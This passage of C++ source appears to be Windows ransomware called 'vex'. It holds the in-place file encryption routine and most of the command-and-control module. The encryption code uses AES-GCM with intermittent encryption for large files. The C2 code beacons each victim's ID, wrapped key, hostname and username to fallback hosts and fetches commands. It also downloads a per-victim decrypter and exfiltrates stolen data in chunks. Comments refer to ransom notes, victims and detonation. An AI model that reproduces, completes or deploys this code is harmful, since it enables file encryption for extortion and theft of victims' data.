            if (api.SetProperty(hAlg, BCRYPT_CHAINING_MODE,
                (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0) != 0) {
                api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            BCRYPT_KEY_HANDLE hKey = NULL;
            if (api.GenSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key,
                config::kAesKeyBytes, 0) != 0) {
                api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            const std::wstring path = canonicalPath;
            const std::wstring extPath = utils::extended(path);

            DWORD attrs = GetFileAttributesW(extPath.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES) {
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            HANDLE hIn = CreateFileW(extPath.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
            if (hIn == INVALID_HANDLE_VALUE) {
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            BY_HANDLE_FILE_INFORMATION bhfi{};
            if (GetFileInformationByHandle(hIn, &bhfi) &&
                bhfi.nNumberOfLinks > 1) {
                CloseHandle(hIn);
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Skip; // never half-encrypt a hard-link set
            }
            if (attrs & (FILE_ATTRIBUTE_SPARSE_FILE | FILE_ATTRIBUTE_COMPRESSED |
                         FILE_ATTRIBUTE_OFFLINE) || HasAlternateStreams(path)) {
                CloseHandle(hIn);
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Skip; // unsupported metadata; do not leak an ADS
            }

            // Preserve the original timestamps for the decrypter.
            FILETIME ftCreate{}, ftAccess{}, ftWrite{};
            bool timesOk = GetFileTime(hIn, &ftCreate, &ftAccess, &ftWrite) != FALSE;

            char magic[4]{};
            DWORD got = 0;
            if (ReadFile(hIn, magic, 4, &got, NULL) && got == 4 &&
                memcmp(magic, "VEX2", 4) == 0) {
                CloseHandle(hIn);
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Skip;
            }
            SetFilePointer(hIn, 0, NULL, FILE_BEGIN);

            if (attrs & FILE_ATTRIBUTE_READONLY)
                SetFileAttributesW(extPath.c_str(), attrs & ~FILE_ATTRIBUTE_READONLY);

            LARGE_INTEGER fileSize{};
            if (!GetFileSizeEx(hIn, &fileSize)) {
                CloseHandle(hIn);
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            const uint64_t total = (uint64_t)fileSize.QuadPart;
            const size_t CHUNK = sizeof(s.buf);
            const uint64_t chunks = (total + CHUNK - 1) / CHUNK;

            uint32_t stride = 1;
            if (total > config::kIntermittentThreshold && chunks > 1) {
                uint64_t budget = config::kIntermittentBudgetChunks;
                stride = (uint32_t)std::max<uint64_t>(2, (chunks + budget - 1) / budget);
            }

            std::wstring tmpPath = path + L"." + utils::RandomHex(6) + L".vxtmp";
            HANDLE hOut = CreateFileW(utils::extended(tmpPath).c_str(), GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hOut == INVALID_HANDLE_VALUE) {
                CloseHandle(hIn);
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            uint8_t hdr[32];
            memcpy(hdr, "VEX2", 4);
            uint32_t flags = (stride > 1) ? 1u : 0u;
            memcpy(hdr + 4, &flags, 4);
            memcpy(hdr + 8, &total, 8);
            memcpy(hdr + 16, &stride, 4);
            uint32_t chunkSize = (uint32_t)CHUNK;
            memcpy(hdr + 20, &chunkSize, 4);
            memcpy(hdr + 24, &chunks, 8);

            bool ok = utils::WriteExact(hOut, hdr, sizeof(hdr));
            uint64_t bytes = 0;

            Sha256Ctx hasher;
            bool hashOk = hasher.Init();

            for (uint64_t i = 0; ok && i < chunks; i++) {
                DWORD read = 0;
                if (!ReadFile(hIn, s.buf, (DWORD)CHUNK, &read, NULL) || read == 0) {
                    ok = false; break;
                }
                if (hashOk) hasher.Update(s.buf, read);

                bool enc = (stride <= 1) || ((i % stride) == 0) || (i + 1 == chunks);
                uint8_t mode = enc ? 1 : 0;
                if (!utils::WriteExact(hOut, &mode, 1) ||
                    !utils::WriteExact(hOut, &read, 4)) { ok = false; break; }

                if (!enc) {
                    if (!utils::WriteExact(hOut, s.buf, read)) { ok = false; break; }
                    bytes += read;
                    continue;
                }

                uint8_t nonce[12]{};
                if (!GenNonce(nonce)) { ok = false; break; }

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
                BCRYPT_INIT_AUTH_MODE_INFO(info);
                info.pbNonce = nonce;
                info.cbNonce = sizeof(nonce);
                info.pbAuthData = NULL;
                info.cbAuthData = 0;
                info.pbTag = s.ct + read;
                info.cbTag = 16;

                ULONG ctLen = 0;
                NTSTATUS st = api.Encrypt(hKey, s.buf, read, &info, NULL, 0,
                    s.ct, read, &ctLen, 0);
                if (st != 0 || ctLen != read) { ok = false; break; }

                if (!utils::WriteExact(hOut, nonce, sizeof(nonce)) ||
                    !utils::WriteExact(hOut, s.ct, ctLen) ||
                    !utils::WriteExact(hOut, s.ct + read, 16)) { ok = false; break; }
                bytes += read;
            }

            if (ok) {
                LARGE_INTEGER outSize{};
                if (!GetFileSizeEx(hOut, &outSize) || outSize.QuadPart < (LONGLONG)sizeof(hdr))
                    ok = false;
            }
            // The plaintext is about to be unlinked. Make the ciphertext
            // durable first; otherwise a power loss can keep the rename and
            // lose the data.
            if (ok && !FlushFileBuffers(hOut)) ok = false;

            CloseHandle(hIn);
            CloseHandle(hOut);

            if (!ok) {
                DeleteFileW(utils::extended(tmpPath).c_str());
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            uint8_t plainSha[32]{};
            if (hashOk) hasher.Final(plainSha);

            {
                std::lock_guard<std::mutex> lg(jmtx);
                // Journal v3: "VXJ2" | version | flags, then records of
                // len | crc32(body) | body(create|access|write|sha256|size|orig...).
                if (journal.tellp() == 0) {
                    uint32_t ver = 3, jflags = 0;
                    journal.write("VXJ2", 4);
                    journal.write((const char*)&ver, 4);
                    journal.write((const char*)&jflags, 4);
                }
                std::string orig = utils::EscapeJournalPath(path);
                std::string enc = orig;
                std::string body;
                uint64_t ctime = timesOk
                    ? (((uint64_t)ftCreate.dwHighDateTime << 32) | ftCreate.dwLowDateTime) : 0;
                uint64_t atime = timesOk
                    ? (((uint64_t)ftAccess.dwHighDateTime << 32) | ftAccess.dwLowDateTime) : 0;
                uint64_t wtime = timesOk
                    ? (((uint64_t)ftWrite.dwHighDateTime << 32) | ftWrite.dwLowDateTime) : 0;
                body.append((const char*)&ctime, 8);
                body.append((const char*)&atime, 8);
                body.append((const char*)&wtime, 8);
                body.append((const char*)plainSha, 32);
                uint64_t size = total;
                body.append((const char*)&size, 8);
                uint32_t ol = (uint32_t)orig.size();
                body.append((const char*)&ol, 4);
                body.append(orig);
                uint32_t el = (uint32_t)enc.size();
                body.append((const char*)&el, 4);
                body.append(enc);

                uint32_t len = (uint32_t)body.size();
                uint32_t crc = Crc32((const uint8_t*)body.data(), body.size());
                journal.write((const char*)&len, 4);
                journal.write((const char*)&crc, 4);
                journal.write(body.data(), body.size());
                journal.flush();
                FlushJournal(journalPath);
                if (!journal.good()) {
                    DeleteFileW(utils::extended(tmpPath).c_str());
                    api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                    return Result::Fail;
                }
            }

            // Keep the original attributes/ACL on the container so the
            // decrypter can put them back on the restored plaintext.
            SetFileAttributesW(utils::extended(tmpPath).c_str(), attrs);
            CopySecurity(path, tmpPath);

            // Atomic replace: the original name survives, contents are now VEX2.
            if (!MoveFileExW(utils::extended(tmpPath).c_str(),
                utils::extended(path).c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                DeleteFileW(utils::extended(tmpPath).c_str());
                api.DestroyKey(hKey); api.CloseProvider(hAlg, 0);
                return Result::Fail;
            }

            api.DestroyKey(hKey);
            api.CloseProvider(hAlg, 0);
            if (bytesOut) *bytesOut = bytes;
            return Result::Ok;
        }
    } // namespace crypto
} // namespace vex

// ============================================================================
// 5. COMMS
// ============================================================================
namespace vex {
    namespace comms {
        struct Api {
            decltype(&WinHttpOpen) Open = nullptr;
            decltype(&WinHttpConnect) Connect = nullptr;
            decltype(&WinHttpOpenRequest) OpenRequest = nullptr;
            decltype(&WinHttpSendRequest) Send = nullptr;
            decltype(&WinHttpReceiveResponse) Receive = nullptr;
            decltype(&WinHttpCloseHandle) Close = nullptr;
            decltype(&WinHttpSetOption) SetOption = nullptr;
            decltype(&WinHttpQueryHeaders) QueryHeaders = nullptr;
            decltype(&WinHttpQueryDataAvailable) QueryDataAvailable = nullptr;
            decltype(&WinHttpReadData) ReadData = nullptr;
            decltype(&WinHttpSetTimeouts) SetTimeouts = nullptr;
        } api{};

        static bool Init() {
            HMODULE hWin = LoadLibraryA(X("winhttp.dll").c_str());
            if (!hWin) return false;
            api.Open = (decltype(&WinHttpOpen))GetProcAddress(hWin, X("WinHttpOpen").c_str());
            api.Connect = (decltype(&WinHttpConnect))GetProcAddress(hWin, X("WinHttpConnect").c_str());
            api.OpenRequest = (decltype(&WinHttpOpenRequest))GetProcAddress(hWin, X("WinHttpOpenRequest").c_str());
            api.Send = (decltype(&WinHttpSendRequest))GetProcAddress(hWin, X("WinHttpSendRequest").c_str());
            api.Receive = (decltype(&WinHttpReceiveResponse))GetProcAddress(hWin, X("WinHttpReceiveResponse").c_str());
            api.Close = (decltype(&WinHttpCloseHandle))GetProcAddress(hWin, X("WinHttpCloseHandle").c_str());
            api.SetOption = (decltype(&WinHttpSetOption))GetProcAddress(hWin, X("WinHttpSetOption").c_str());
            api.QueryHeaders = (decltype(&WinHttpQueryHeaders))GetProcAddress(hWin, X("WinHttpQueryHeaders").c_str());
            api.QueryDataAvailable = (decltype(&WinHttpQueryDataAvailable))GetProcAddress(hWin, X("WinHttpQueryDataAvailable").c_str());
            api.ReadData = (decltype(&WinHttpReadData))GetProcAddress(hWin, X("WinHttpReadData").c_str());
            api.SetTimeouts = (decltype(&WinHttpSetTimeouts))GetProcAddress(hWin, X("WinHttpSetTimeouts").c_str());
            return api.Open && api.Connect && api.QueryHeaders && api.QueryDataAvailable && api.ReadData;
        }

        // ---------------------------------------------------------- endpoints
        static std::wstring OverrideDir() {
            std::wstring p = utils::ExpandEnv(L"%ProgramData%");
            if (p.empty() || p[0] == L'%') p = L"C:\\ProgramData";
            return p + L"\\VEX";
        }
        static std::wstring OverridePath() {
            return OverrideDir() + L"\\c2h";
        }

        static std::vector<uint8_t> g_secret;

        static bool HasSecret() { return g_secret.size() == 32; }

        static std::wstring SecretPath() { return OverrideDir() + L"\\sec"; }

        static void LoadSecret() {
            g_secret.clear();
            HANDLE h = CreateFileW(utils::extended(SecretPath()).c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return;
            uint8_t buf[32]{};
            DWORD got = 0;
            if (ReadFile(h, buf, 32, &got, NULL) && got == 32)
                g_secret.assign(buf, buf + 32);
            CloseHandle(h);
        }

        static void SaveSecret(const std::vector<uint8_t>& s) {
            if (s.size() != 32) return;
            CreateDirectoryW(utils::extended(OverrideDir()).c_str(), NULL);
            utils::ProtectStatePath(OverrideDir());
            std::wstring tmp = SecretPath() + L".tmp";
            DeleteFileW(utils::extended(tmp).c_str());
            HANDLE h = CreateFileW(utils::extended(tmp).c_str(), GENERIC_WRITE,
                FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
            if (h == INVALID_HANDLE_VALUE) return;
            DWORD w = 0;
            bool ok = WriteFile(h, s.data(), 32, &w, NULL) && w == 32 &&
                FlushFileBuffers(h);
            CloseHandle(h);
            if (!ok || !MoveFileExW(utils::extended(tmp).c_str(),
                utils::extended(SecretPath()).c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                DeleteFileW(utils::extended(tmp).c_str());
                return;
            }
            g_secret = s;
            SetFileAttributesW(utils::extended(SecretPath()).c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        static bool ValidHost(const std::wstring& h) {            if (h.empty() || h.size() > 253) return false;
            for (wchar_t c : h) {
                if (!(iswalnum(c) || c == L'.' || c == L'-')) return false;
            }
            return true;
        }

        static std::wstring ReadHostOverride() {
            HANDLE h = CreateFileW(utils::extended(OverridePath()).c_str(),
                GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return L"";
            char buf[512]{};
            DWORD got = 0;
            bool ok = ReadFile(h, buf, sizeof(buf) - 1, &got, NULL) && got > 0;
            CloseHandle(h);
            if (!ok) return L"";
            std::string s(buf, got);
            while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' '))
                s.pop_back();
            std::wstring w = utils::widen(s);
            return ValidHost(w) ? w : L"";
        }

        static void SaveHost(const std::wstring& host) {
            if (!ValidHost(host)) return;
            CreateDirectoryW(utils::extended(OverrideDir()).c_str(), NULL);
            utils::ProtectStatePath(OverrideDir());
            std::wstring tmp = OverridePath() + L".tmp";
            HANDLE h = CreateFileW(utils::extended(tmp).c_str(), GENERIC_WRITE,
                FILE_SHARE_READ, NULL, CREATE_ALWAYS,
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL, NULL);
            if (h == INVALID_HANDLE_VALUE) return;
            std::string s = utils::narrow(host);
            DWORD wrote = 0;
            bool ok = WriteFile(h, s.data(), (DWORD)s.size(), &wrote, NULL) &&
                wrote == s.size() && FlushFileBuffers(h);
            CloseHandle(h);
            if (!ok || !MoveFileExW(utils::extended(tmp).c_str(),
                utils::extended(OverridePath()).c_str(),
                MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                DeleteFileW(utils::extended(tmp).c_str());
                return;
            }
            SetFileAttributesW(utils::extended(OverridePath()).c_str(),
                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }

        static std::wstring g_c2HostOverride;
        static uint16_t g_c2PortOverride = 0;
        static bool g_c2SecureOverride = true;

        static void SetEndpoint(const std::wstring& host, uint16_t port, bool secure) {
            g_c2HostOverride = host;
            g_c2PortOverride = port;
            g_c2SecureOverride = secure;
        }

        static std::vector<std::wstring> HostList() {
            std::vector<std::wstring> out;
            auto add = [&](const std::wstring& h) {
                if (h.empty()) return;
                for (const auto& e : out)
                    if (_wcsicmp(e.c_str(), h.c_str()) == 0) return;
                out.push_back(h);
                };
            add(g_c2HostOverride);
            add(ReadHostOverride());
            add(config::kC2Host);
            for (const auto& h : config::kC2Fallbacks) add(h);
            return out;
        }

        // The endpoint that actually answered. The ransom note must point at a
        // host the victim can reach, not at the compile-time default.
        static std::wstring g_activeHost;
        static std::mutex g_hostMtx;
        static std::wstring ActiveHost() {
            std::lock_guard<std::mutex> g(g_hostMtx);
            if (!g_activeHost.empty()) return g_activeHost;
            std::vector<std::wstring> list = HostList();
            return list.empty() ? config::kC2Host : list.front();
        }
        static void SetActiveHost(const std::wstring& h) {
            std::lock_guard<std::mutex> g(g_hostMtx);
            g_activeHost = h;
        }

        // Only loopback may use cleartext (local test panels). Everything else
        // must be HTTPS with normal certificate validation.
        static bool IsLoopbackHost(const std::wstring& host) {
            std::wstring h = host;
            std::transform(h.begin(), h.end(), h.begin(), ::towlower);
            return h == L"127.0.0.1" || h == L"localhost" || h == L"::1";
        }

        struct Resp {
            DWORD status = 0;
            std::string body;
        };

        static Resp Http(const std::wstring& host, const wchar_t* verb,
            const std::wstring& path, const std::string& body, bool wantBody,
            DWORD timeoutMs = 8000) {
            Resp r{};
            HINTERNET hS = api.Open(L"vex/4.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hS) return r;
            if (api.SetTimeouts) api.SetTimeouts(hS, timeoutMs, timeoutMs, timeoutMs, timeoutMs);
            if (api.SetOption) {
                DWORD noRedirect = WINHTTP_DISABLE_REDIRECTS;
                api.SetOption(hS, WINHTTP_OPTION_DISABLE_FEATURE,
                    &noRedirect, sizeof(noRedirect));
            }

            const uint16_t port = g_c2PortOverride ? g_c2PortOverride : config::kC2Port;
            DWORD reqFlags = (g_c2PortOverride && !g_c2SecureOverride) ? 0 : WINHTTP_FLAG_SECURE;
            if (!(reqFlags & WINHTTP_FLAG_SECURE) && !IsLoopbackHost(host)) {
                api.Close(hS);
                return r;
            }
            HINTERNET hC = api.Connect(hS, host.c_str(), port, 0);
            if (!hC) { api.Close(hS); return r; }

            HINTERNET hR = api.OpenRequest(hC, verb, path.c_str(), nullptr,
                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
            if (hR) {
                std::wstring headers;
                if (!config::kApiToken.empty())
                    headers += L"X-Vex-Token: " + config::kApiToken + L"\r\n";
                if (!body.empty()) headers += L"Content-Type: application/x-www-form-urlencoded\r\n";

                // Signed protocol: timestamp + HMAC over "ts|path|body".
                if (g_secret.size() == 32) {
                    std::wstring signPath = path;
                    size_t q = signPath.find(L'?');
                    if (q != std::wstring::npos) signPath = signPath.substr(0, q);
                    long long ts = (long long)time(nullptr);
                    std::string material = std::to_string(ts) + "|" +
                        utils::narrow(signPath) + "|" + body;
                    std::string sig = crypto::HmacSha256Hex(g_secret.data(),
                        g_secret.size(), material);
                    if (!sig.empty()) {
                        headers += L"X-Vex-Ts: " + std::to_wstring(ts) + L"\r\n";
                        headers += L"X-Vex-Sig: " + utils::widen(sig) + L"\r\n";
                    }
                }

                BOOL sent = body.empty()
                    ? api.Send(hR, headers.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : headers.c_str(),
                        (DWORD)-1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)
                    : api.Send(hR, headers.c_str(), (DWORD)-1L,
                        (LPVOID)body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
                if (sent && api.Receive(hR, nullptr)) {
                    DWORD sz = sizeof(r.status);
                    api.QueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &r.status, &sz, WINHTTP_NO_HEADER_INDEX);
                    if (wantBody && r.status >= 200 && r.status < 300) {
                        char buf[4096];
                        DWORD avail = 0;
                        while (r.body.size() < 65536) {
                            if (!api.QueryDataAvailable(hR, &avail) || avail == 0) break;
                            if (avail > sizeof(buf)) avail = sizeof(buf);
                            DWORD got = 0;
                            if (!api.ReadData(hR, buf, avail, &got) || got == 0) break;
                            r.body.append(buf, got);
                            if (got < avail) break;
                        }
                    }
                }
                api.Close(hR);
            }
            api.Close(hC); api.Close(hS);
            return r;
        }

        static bool DownloadFile(const std::wstring& host, const std::wstring& path,
            const std::wstring& outPath, DWORD timeoutMs = 15000) {
            HINTERNET hS = api.Open(L"vex/4.0", WINHTTP_ACCESS_TYPE_NO_PROXY,
                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
            if (!hS) return false;
            if (api.SetTimeouts) api.SetTimeouts(hS, timeoutMs, timeoutMs, timeoutMs, timeoutMs);
            if (api.SetOption) {
                DWORD noRedirect = WINHTTP_DISABLE_REDIRECTS;
                api.SetOption(hS, WINHTTP_OPTION_DISABLE_FEATURE,
                    &noRedirect, sizeof(noRedirect));
            }

            const uint16_t port = g_c2PortOverride ? g_c2PortOverride : config::kC2Port;
            DWORD reqFlags = (g_c2PortOverride && !g_c2SecureOverride) ? 0 : WINHTTP_FLAG_SECURE;
            if (!(reqFlags & WINHTTP_FLAG_SECURE) && !IsLoopbackHost(host)) {
                api.Close(hS);
                return false;
            }
            HINTERNET hC = api.Connect(hS, host.c_str(), port, 0);
            if (!hC) { api.Close(hS); return false; }

            HINTERNET hR = api.OpenRequest(hC, L"GET", path.c_str(), nullptr,
                WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, reqFlags);
            bool ok = false;
            HANDLE hOut = INVALID_HANDLE_VALUE;
            if (hR) {
                std::wstring headers;
                if (!config::kApiToken.empty())
                    headers += L"X-Vex-Token: " + config::kApiToken + L"\r\n";
                if (g_secret.size() == 32) {
                    std::wstring signPath = path;
                    size_t q = signPath.find(L'?');
                    if (q != std::wstring::npos) signPath = signPath.substr(0, q);
                    long long ts = (long long)time(nullptr);
                    std::string material = std::to_string(ts) + "|" +
                        utils::narrow(signPath) + "|";
                    std::string sig = crypto::HmacSha256Hex(g_secret.data(),
                        g_secret.size(), material);
                    if (!sig.empty()) {
                        headers += L"X-Vex-Ts: " + std::to_wstring(ts) + L"\r\n";
                        headers += L"X-Vex-Sig: " + utils::widen(sig) + L"\r\n";
                    }
                }

                if (api.Send(hR, headers.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : headers.c_str(),
                    (DWORD)-1L, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                    api.Receive(hR, nullptr)) {
                    DWORD status = 0, sz = sizeof(status);
                    api.QueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
                    if (status >= 200 && status < 300) {
                        hOut = CreateFileW(outPath.c_str(), GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                        ok = hOut != INVALID_HANDLE_VALUE;
                        size_t total = 0;
                        const size_t kMax = 16 * 1024 * 1024;
                        char buf[8192];
                        while (ok) {
                            DWORD avail = 0;
                            if (!api.QueryDataAvailable(hR, &avail) || avail == 0) break;
                            if (avail > sizeof(buf)) avail = sizeof(buf);
                            DWORD got = 0;
                            if (!api.ReadData(hR, buf, avail, &got) || got == 0) break;
                            if (total + got > kMax) { ok = false; break; }
                            DWORD written = 0;
                            if (!WriteFile(hOut, buf, got, &written, NULL) || written != got) {
                                ok = false;
                                break;
                            }
                            total += got;
                        }
                        if (ok && total < 1024) ok = false; // not a real binary
                    }
                }
                api.Close(hR);
            }
            if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
            api.Close(hC); api.Close(hS);
            if (!ok) DeleteFileW(outPath.c_str());
            return ok;
        }

        static bool Beacon(const uint8_t vid[16], const uint8_t wrapped[256],
            const std::string& os_info) {
            if (!api.Open) return false;
            wchar_t host[256] = {}, user[256] = {};
            DWORD hl = 256, ul = 256;
            GetComputerNameW(host, &hl); GetUserNameW(user, &ul);

            std::string body = "vid=" + utils::UrlEncode(utils::b64(vid, 16))
                + "&key=" + utils::UrlEncode(utils::b64(wrapped, 256))
                + "&host=" + utils::UrlEncode(utils::narrow(host))
                + "&user=" + utils::UrlEncode(utils::narrow(user))
                + "&os=" + utils::UrlEncode(os_info)
                + "&v=5";

            for (const auto& h : HostList()) {
                Resp r = Http(h, L"POST", config::kC2Path, body, true);
                if (r.status >= 200 && r.status < 300) {
                    SetActiveHost(h);
                    size_t sp = r.body.find("secret=");
                    if (sp != std::string::npos) {
                        std::string b = r.body.substr(sp + 7);
                        size_t e = b.find_first_of("\r\n");
                        if (e != std::string::npos) b = b.substr(0, e);
                        std::vector<uint8_t> sec = utils::unb64(b);
                        if (sec.size() == 32) SaveSecret(sec);
                    }
                    return true;
                }
            }
            return false;
        }

        // Base64 contains '+', '/' and '=' — escape them so the VID survives
        // the query string intact.
        static std::wstring EncodeVidForQuery(const uint8_t vid[16]) {
            std::string b = utils::b64(vid, 16);
            std::wstring out;
            out.reserve(b.size() * 3);
            for (char c : b) {
                if (c == '+') out += L"%2B";
                else if (c == '/') out += L"%2F";
                else if (c == '=') out += L"%3D";
                else out += (wchar_t)c;
            }
            return out;
        }

        // Signed delivery of the per-victim decrypter for the pardon flow.
        static bool DownloadPardon(const uint8_t vid[16], const std::wstring& outPath) {
            if (!api.Open) return false;
            std::wstring path = config::kPardonPath + L"?vid=" + EncodeVidForQuery(vid);
            std::vector<std::wstring> hosts = HostList();
            std::wstring active = ActiveHost();
            if (!active.empty()) {
                for (auto it = hosts.begin(); it != hosts.end(); ++it) {
                    if (_wcsicmp(it->c_str(), active.c_str()) == 0) {
                        hosts.erase(it);
                        break;
                    }
                }
                hosts.insert(hosts.begin(), active);
            }
            int tries = 0;
            for (const auto& h : hosts) {
                if (tries++ >= 3) break;
                if (DownloadFile(h, path, outPath)) {
                    SetActiveHost(h);
                    return true;
                }
            }
            return false;
        }

        // Raw ping body from the first reachable host (may contain command and
        // host directives). Empty on total failure: a C2 hiccup must never
        // trigger unattended encryption.
        static std::string PingBody(const uint8_t vid[16]) {
            if (!api.Open) return "";
            std::wstring q = config::kC2PingPath + L"?vid=" + EncodeVidForQuery(vid);
            for (const auto& h : HostList()) {
                Resp r = Http(h, L"GET", q, "", true, 10000);
                if (r.status >= 200 && r.status < 300) {
                    SetActiveHost(h);
                    return r.body;
                }
            }
            return "";
        }

        // Fire-and-forget telemetry. A failed report must never change what
        // the payload does, and it must never stall detonation: prefer the
        // endpoint that already answered, try at most two hosts, and keep the
        // per-call timeout short.
        static bool Report(const uint8_t vid[16], const std::string& kind,
            const std::string& detail) {
            if (!api.Open) return false;
            wchar_t host[256] = {}, user[256] = {};
            DWORD hl = 256, ul = 256;
            GetComputerNameW(host, &hl); GetUserNameW(user, &ul);

            std::string body = "vid=" + utils::UrlEncode(utils::b64(vid, 16))
                + "&kind=" + utils::UrlEncode(kind)
                + "&detail=" + utils::UrlEncode(detail)
                + "&host=" + utils::UrlEncode(utils::narrow(host))
                + "&user=" + utils::UrlEncode(utils::narrow(user));

            std::vector<std::wstring> hosts = HostList();
            std::wstring active = ActiveHost();
            if (!active.empty()) {
                for (auto it = hosts.begin(); it != hosts.end(); ++it) {
                    if (_wcsicmp(it->c_str(), active.c_str()) == 0) {
                        hosts.erase(it);
                        break;
                    }
                }
                hosts.insert(hosts.begin(), active);
            }

            int tries = 0;
            for (const auto& h : hosts) {
                if (tries++ >= 2) break;
                Resp r = Http(h, L"POST", config::kC2ReportPath, body, false, 1200);
                if (r.status >= 200 && r.status < 300) {
                    // Do not rewrite g_activeHost here: reports can run from the
                    // short-lived telemetry thread while the main thread is
                    // encrypting. Beacon/ping own that variable.
                    return true;
                }
            }
            return false;
        }

        static std::string Hex32(const uint8_t* p, size_t n) {
            static const char* h = "0123456789abcdef";
            std::string out;
            out.reserve(n * 2);
            for (size_t i = 0; i < n; i++) {
                out.push_back(h[p[i] >> 4]);
                out.push_back(h[p[i] & 15]);
            }
            return out;
        }

        static uint64_t ParseId(const std::string& body, const char* key) {
            size_t p = body.find(key);
            if (p == std::string::npos) return 0;
            p += strlen(key);
            while (p < body.size() &&
                   (body[p] == ' ' || body[p] == '"' || body[p] == ':')) p++;
            uint64_t v = 0;
            while (p < body.size() && body[p] >= '0' && body[p] <= '9') {
                v = v * 10 + (uint64_t)(body[p] - '0');
                p++;
            }
            return v;
        }

        // Exfil v2: manifest + resumable, HMAC-verified chunks. The panel
        // stores chunks encrypted at rest and reconstructs on download.
        static bool UploadV2(const uint8_t vid[16], const std::string& name,
            const std::string& data) {
            if (!api.Open) return false;
            const size_t CHUNK = 4 * 1024 * 1024;
            int total = (int)((data.size() + CHUNK - 1) / CHUNK);
            if (total <= 0) total = 1;

            crypto::Sha256Ctx whole;
            if (!whole.Init()) return false;
            whole.Update((const uint8_t*)data.data(), data.size());
            uint8_t full[32]{};
            whole.Final(full);

            std::string manifest = "vid=" + utils::UrlEncode(utils::b64(vid, 16))
                + "&name=" + utils::UrlEncode(name)
                + "&size=" + std::to_string(data.size())
                + "&sha256=" + Hex32(full, 32)
                + "&total=" + std::to_string(total);

            uint64_t fileId = 0;
            for (const auto& h : HostList()) {
                Resp r = Http(h, L"POST", L"/api/exfil/v2/manifest", manifest, true, 15000);
                if (r.status >= 200 && r.status < 300) {
                    fileId = ParseId(r.body, "\"file_id\":");
                    if (fileId) break;
                }
            }
            if (!fileId) return false;

            for (int i = 0; i < total; i++) {
                size_t off = (size_t)i * CHUNK;
                size_t len = (std::min)(CHUNK, data.size() - off);
                std::string part = data.substr(off, len);
                crypto::Sha256Ctx hc;
                if (!hc.Init()) return false;
                hc.Update((const uint8_t*)part.data(), part.size());
                uint8_t digest[32]{};
                hc.Final(digest);
                std::string body = "vid=" + utils::UrlEncode(utils::b64(vid, 16))
                    + "&file_id=" + std::to_string(fileId)
                    + "&idx=" + std::to_string(i)
                    + "&sha256=" + Hex32(digest, 32)
                    + "&data=" + utils::UrlEncode(utils::b64(
                        (const uint8_t*)part.data(), part.size()));
                bool sent = false;
                for (const auto& h : HostList()) {
                    Resp r = Http(h, L"POST", L"/api/exfil/v2/chunk", body, true, 30000);
                    if (r.status >= 200 && r.status < 300) { sent = true; break; }
                }
                if (!sent) return false;
            }
            return true;
        }

        // Chunked exfiltration. The panel assembles chunks by (vid, name).
        static bool Upload(const uint8_t vid[16], const std::string& name,
            int idx, int total, const std::string& data,
            const std::string& xfer = "") {
